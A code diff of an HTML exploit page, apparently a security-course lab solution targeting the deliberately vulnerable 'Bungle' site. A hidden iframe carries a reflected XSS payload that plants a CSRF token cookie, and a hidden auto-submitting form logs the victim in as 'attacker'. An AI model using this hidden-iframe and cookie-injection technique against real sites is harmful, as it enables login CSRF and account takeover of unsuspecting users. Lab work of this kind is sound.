@@ -3,8 +3,8 @@
 	<head>
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	</head>
-	<body onload="document.forms[0].submit()">
-		<iframe name="dummysaframe" width="0" height="0" border="0" style="display: none;" src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie=%27csrf_token=826484eab39076288f9fadf6ef7bccde%27%3C/script%3E"></iframe>
+	<body>
+		<iframe onload="document.forms[0].submit()" name="dummysaframe" width="0" height="0" border="0" style="display: none;" src="http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Edocument.cookie=%27csrf_token=826484eab39076288f9fadf6ef7bccde%27%3C/script%3E"></iframe>
 		<form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" target="dummysaframe">
 			<input name="csrf_token" value="826484eab39076288f9fadf6ef7bccde" type="hidden">
 			<input type="hidden" name="username" value="attacker"/>
